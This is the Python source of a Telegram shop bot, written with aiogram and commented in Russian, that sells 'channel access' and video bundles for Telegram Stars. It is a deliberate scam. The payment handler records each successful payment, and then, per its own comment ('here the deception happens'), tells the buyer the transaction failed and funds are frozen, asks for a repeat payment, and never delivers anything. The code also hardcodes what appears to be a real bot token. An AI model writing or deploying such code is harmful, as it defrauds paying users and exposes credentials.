import asyncio
import logging
import sqlite3
from datetime import datetime

from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, LabeledPrice, PreCheckoutQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

logging.basicConfig(level=logging.INFO)
BOT_TOKEN = "8237086271:AAFOo4KN1Xpht9iQB9zlk2NKX3D1dq1NND0"
router = Router()

# Настройка базы данных
conn = sqlite3.connect('bot_data.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS payments (user_id INT, amount INT, charge_id TEXT, date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INT PRIMARY KEY, join_date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS products (name TEXT, price INT)''')
c.execute("INSERT OR IGNORE INTO products VALUES ('Доступ к каналу', 50), ('1000 видео', 25), ('500 видео', 10)")
conn.commit()

def admin_keyboard():
    kb = [
        [InlineKeyboardButton(text="💰 Изменить цену", callback_data="admin_change_price")],
        [InlineKeyboardButton(text="📝 Переименовать товар", callback_data="admin_rename")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def store_keyboard():
    builder = InlineKeyboardBuilder()
    c.execute("SELECT name, price FROM products")
    for prod_name, prod_price in c.fetchall():
        builder.button(text=f"{prod_name} - {prod_price}⭐", callback_data=f"buy_{prod_name}")
    builder.button(text="🛒 Мои заказы", callback_data="my_orders")
    builder.adjust(1)
    return builder.as_markup()

@router.message(Command("start"))
async def start_cmd(message: Message):
    c.execute("INSERT OR IGNORE INTO users (user_id, join_date) VALUES (?, ?)", (message.from_user.id, datetime.now().isoformat()))
    conn.commit()
    await message.answer(f"🛒 **Магазин**\n\nВыберите товар для покупки. После оплаты вы получите продукт.\n\n⚠️ **Внимание:** Возможны задержки из-за нагрузки на сервер.", reply_markup=store_keyboard(), parse_mode="Markdown")

@router.callback_query(F.data.startswith("buy_"))
async def buy_process(callback: CallbackQuery):
    product = callback.data.split("_", 1)[1]
    c.execute("SELECT price FROM products WHERE name=?", (product,))
    price = c.fetchone()[0]
    await callback.message.answer_invoice(
        title=f"Покупка: {product}",
        description=f"Мгновенная доставка после оплаты.",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=product, amount=price)],
        payload=f"fake_payload_{product}_{callback.from_user.id}"
    )

@router.pre_checkout_query()
async def pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

@router.message(F.successful_payment)
async def successful_payment(message: Message):
    # Логируем платеж
    c.execute("INSERT INTO payments (user_id, amount, charge_id, date) VALUES (?, ?, ?, ?)",
              (message.from_user.id, message.successful_payment.total_amount, message.successful_payment.telegram_payment_charge_id, datetime.now().isoformat()))
    conn.commit()
    # Здесь происходит обман: показываем ошибку, товар не выдаем.
    error_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔄 Повторить оплату", callback_data="retry_payment")]])
    await message.answer(f"❌ **Ошибка обработки платежа**\n\nТранзакция #TX-{message.successful_payment.telegram_payment_charge_id[-8:]} не удалась из-за ошибки проверки сервера. Средства временно заморожены. Пожалуйста, повторите оплату для завершения заказа.", reply_markup=error_kb, parse_mode="Markdown")

@router.callback_query(F.data == "retry_payment")
async def retry_payment(callback: CallbackQuery):
    await callback.message.answer("⚠️ Пожалуйста, используйте /start, чтобы снова выбрать товар и повторно инициировать оплату.")

@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id == 6893832048:  # ЗАМЕНИТЕ НА СВОЙ ID
        await message.answer("Панель администратора:", reply_markup=admin_keyboard())

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    c.execute("SELECT COUNT(*) FROM users")
    user_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*), SUM(amount) FROM payments")
    pay_count, total_stars = c.fetchone()
    total_stars = total_stars if total_stars else 0
    await callback.message.answer(f"📊 **Статистика**\nПользователей: {user_count}\nВсего платежей: {pay_count}\nВсего звёзд: {total_stars}⭐", parse_mode="Markdown")

@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_init(callback: CallbackQuery):
    await callback.message.answer("Отправьте сообщение для рассылки.")

@router.message(F.text & F.from_user.id == ВАШ_ID_АДМИНА)
async def admin_broadcast_send(message: Message):
    # Простая проверка на ответ сообщением с текстом "рассылка"
    if message.reply_to_message and "рассылка" in message.reply_to_message.text.lower():
        c.execute("SELECT user_id FROM users")
        for (user_id,) in c.fetchall():
            try:
                await bot.send_message(user_id, message.text)
            except:
                pass
        await message.answer("Рассылка отправлена.")

async def main():
    global bot
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
